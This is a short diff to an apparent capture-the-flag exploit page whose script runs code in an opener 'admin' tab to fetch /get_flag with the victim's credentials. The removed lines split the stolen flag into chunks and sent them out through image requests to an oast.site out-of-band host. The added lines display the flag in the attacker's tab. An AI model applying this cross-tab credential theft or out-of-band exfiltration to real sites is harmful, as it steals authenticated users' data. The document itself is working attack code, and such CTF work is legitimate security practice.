@@ -3,21 +3,19 @@
 <body>
 <script>
 if (window.opener) {
+  // This executes in the admin tab
   window.opener.eval(`
     fetch('/get_flag', { credentials: 'include' })
       .then(r => r.text())
       .then(flag => {
-        window.name = btoa(flag);
+        window.name = flag;
       });
   `);
 
+  // This executes in your (attacker's) tab
   setTimeout(() => {
-    let flag = window.name;
-    let chunks = flag.match(/.{1,20}/g);
-    for (let i = 0; i < chunks.length; i++) {
-      let sub = chunks[i] + '.' + i + '.toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site';
-      new Image().src = 'http://' + sub + '/';
-    }
+    const win = window.open('', '_self');
+    win.document.write('<h1>FLAG:</h1><pre>' + window.name + '</pre>');
   }, 1500);
 }
 </script>
